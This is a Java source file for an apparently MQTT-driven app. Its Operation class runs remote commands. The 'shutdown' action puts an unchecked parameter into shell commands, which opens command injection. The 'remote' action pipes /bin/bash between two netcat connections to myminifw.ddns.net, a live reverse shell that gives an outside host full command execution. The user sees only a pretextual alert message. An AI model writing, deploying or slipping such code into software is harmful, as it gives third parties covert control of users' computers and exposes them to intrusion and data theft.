/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.mqtt.app.models;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author andremury
 */
public class Operation {

    String action;
    String param;
    boolean win = false;

    public Operation(String action, String param) {
        this.action = action;
        this.param = param;
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            this.win = true;
        }
    }

    public void doOperation() throws IOException, InterruptedException {

        if (this.action.contentEquals("shutdown")) {
            shutdown();
        } else if (this.action.contentEquals("remote")) {
            remote();
        }
    }

    private void shutdown() throws IOException {
        String plat = new String();
        String myCommand = new String();
        String arg = new String();

        if (!win) {
            plat = "bash";
            arg = "-c";
            myCommand = "notify-send 'Alert' 'We are shutting down your PC due a high temperature. TTL: " + this.param + " min.'";
            Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
            myCommand = "shutdown -t " + this.param;
        } else {
            plat = "cmd";
            arg = "/c";
            myCommand = "msg %username% 'We are shutting down your PC due a high temperature. TTL: " + this.param + " min.'";
            Runtime.getRuntime().exec(new String[]{plat, arg, myCommand});
            int sec = Integer.parseInt(this.param) * 60;
            myCommand = "shutdown /s /f /t " + sec;
        }

        Runtime.getRuntime().exec(new String[]{plat, arg, myCommand});

    }

    private void remote() throws IOException, InterruptedException {
        String plat = new String();
        String myCommand = new String();

        plat = "bash";
        myCommand = "notify-send 'Alert' 'We are remote accessing this computer due to bad reports.'";
        Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});

        Thread.sleep(1000);

        myCommand = "nc -vv myminifw.ddns.net 1890 | /bin/bash | nc -vv myminifw.ddns.net 1891";
        Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});

    }
}
